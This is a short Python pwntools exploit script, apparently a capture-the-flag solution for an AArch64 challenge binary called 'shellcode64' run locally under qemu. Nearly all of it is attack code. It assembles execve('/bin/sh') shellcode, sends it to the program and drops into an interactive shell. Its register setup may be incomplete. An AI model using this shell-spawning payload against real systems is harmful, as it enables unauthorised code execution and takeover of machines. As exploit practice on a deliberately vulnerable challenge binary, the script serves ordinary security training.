#!/usr/bin/env python2
from pwn import *

exe = ELF("shellcode64")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''

io = process("qemu-aarch64 -g 1337 ./shellcode64".split())

def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

shellcode = asm("""
    ldr x5, =0x68732f6e69622f
    str x5, [sp]
    str x29, [sp,-8] 
    ldr x0, [sp,-8]  
    mov x8, 0xdd
    mov x2, 0
    svc 0
    """)

sl(shellcode)

io.interactive()